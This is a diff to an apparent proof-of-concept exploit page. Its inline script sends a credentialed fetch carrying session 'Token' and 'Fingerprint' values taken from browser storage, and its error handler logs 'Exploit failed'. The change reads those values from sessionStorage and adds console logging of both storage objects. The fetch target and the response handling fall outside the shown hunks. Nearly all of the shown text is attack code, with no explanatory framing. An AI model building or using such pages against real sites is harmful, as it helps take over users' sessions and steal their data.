@@ -9,8 +9,8 @@
         method: "GET",
         credentials: "include",
         headers: {
-         "Token": localStorage.getItem("Token") || sessionStorage.getItem("Token"),
-         "Fingerprint": localStorage.getItem("Fingerprint") || sessionStorage.getItem("Fingerprint")
+         "Token":  sessionStorage.getItem("Token"),
+         "Fingerprint":  sessionStorage.getItem("Fingerprint")
         }// Correctly pass headers here
       })
         .then(response => response.text())
@@ -23,6 +23,8 @@
           });
         })
         .catch(err => console.error("Exploit failed:", err));
+      console.log(localStorage)
+      console.log(sessionStorage)
     </script>
   </body>
 </html>
